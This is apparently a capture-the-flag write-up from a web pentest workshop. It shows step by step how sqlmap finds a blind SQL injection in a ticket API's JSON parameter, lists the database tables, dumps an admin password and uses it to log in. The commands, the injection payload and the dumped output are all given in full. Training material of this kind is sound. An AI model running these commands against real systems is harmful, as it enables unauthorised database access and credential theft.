# Web Application Pentest 5 - Turn it On & Off Again

As an executive, we notice we’ve got some additional functionality. We notice another menu item “IT Support” and the “Executive Board” option on the home page.

Since the challenge is called “Turn it on and off”, we will have a poke around the IT support section.

The IT Section appears to be an area which allows users to submit IT Tickets. We notice that it makes API requests to another server, namely support.workshop.vats.ninja.

Loading the list of tickets, we notice a POST request to http://support.workshop.vats.ninja/ticket/get, with the payload: `{uid: "5", secret: "4Da20BBfG19362c1b4ad6dea4A3aE9G3"}`. The returned data is just a JSON list of tickets.

Since we haven’t had an SQL challenge yet, we pull out SQLMap and try to see what we can find.

We copy the request from burp and save it into a file called tickets.txt:

```
POST /ticket/get HTTP/1.1
Host: support.workshop.vats.ninja
Proxy-Connection: keep-alive
Content-Length: 55
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://10.0.0.2
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36
Content-Type: application/json; charset=UTF-8
Referer: http://10.0.0.2/service/tickets
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8

{"uid":"5","secret":"4Da20BBfG19362c1b4ad6dea4A3aE9G3"}
```

Lets run sqlmap using that request. `sqlmap -r tickets.txt`. When burp asks “JSON data found in POST data. Do you want to process it? [Y/n/q]”, we answer with “y”

```
[18:12:04] [WARNING] (custom) POST parameter 'JSON uid' does not appear dynamic
[18:12:04] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401)
[18:12:04] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 2 times
```

Hmm, 401 errors. That’s okay. We do some googling, and find that sqlmap actually has an option to ignore 401 errors (provided you’re running the latest version
* 1.0-dev-69bc875). We run again, this time using sqlmap -r tickets.txt --ignore-401

`[18:12:39] [WARNING] (custom) POST parameter 'JSON secret' is not injectable`

Still no dice. Let’s increase the level: sqlmap -r tickets.txt --ignore-401 --level=3. That did the job:

```
sqlmap identified the following injection point(s) with a total of 187 HTTP(s) requests:
---
Parameter: JSON uid ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"uid":"5" AND 6601=6601 AND "rgyW"="rgyW","secret":"4Da20BBfG19362c1b4ad6dea4A3aE9G3"}
---
```

Awesome. Let’s get some data out of this database. We use multiple threads to speed up the collection, since this is a blind injection. Additionally, it looks totally badass. `sqlmap.py -r tickets.txt --ignore-401 --level=3 --tables --threads=10`

```
[5 tables]
+----------------+
| ecwidb_replies |
| ecwidb_tickets |
| ecwidb_tokens  |
| ecwidb_users   |
| ticket_replies |
+----------------+
```

Users looks like a place we should look. Lets take a look in there: `sqlmap.py -r tickets.txt --ignore-401 --level=3 --dump -T ecwidb_users --threads=10`

```
Table: ecwidb_users
[1 entry]
+---------+-----------+-----------+
| tid     | tusername | tpassword |
+---------+-----------+-----------+
| <blank> | <blank>   | <blank>   |
+---------+-----------+-----------+
```

Weird. We google the issue with returning blank results, and find issue 861. We re-run using the suggestion of `--time-sec=20. sqlmap.py -r tickets.txt --ignore-401 --level=3 --dump -T ecwidb_users --threads=2 --time-sec=20`

```
Table: ecwidb_users
[1 entry]
+----+----------+--------------------+
| id | username | password           |
+----+----------+--------------------+
| 1  | admin    | #d0ntev3nTryn00bz! |
+----+----------+--------------------+
```

We’ve now got the password to the IT support system, however, we don’t know where to put it. We’re going to need to hunt for a login page.

Navigating to http://support.workshop.vats.ninja/ gies us a 404 page, so does http://support.workshop.vats.ninja/login. Maybe if we try http://support.workshop.vats.ninja/admin/. Interesting. We get a Flask/WSGI looking “Unauthorized” message. Since we know this is some sort of working endpoint, we browse to http://support.workshop.vats.ninja/admin/login. Out pops a login page.

We log in, revealing the flag:
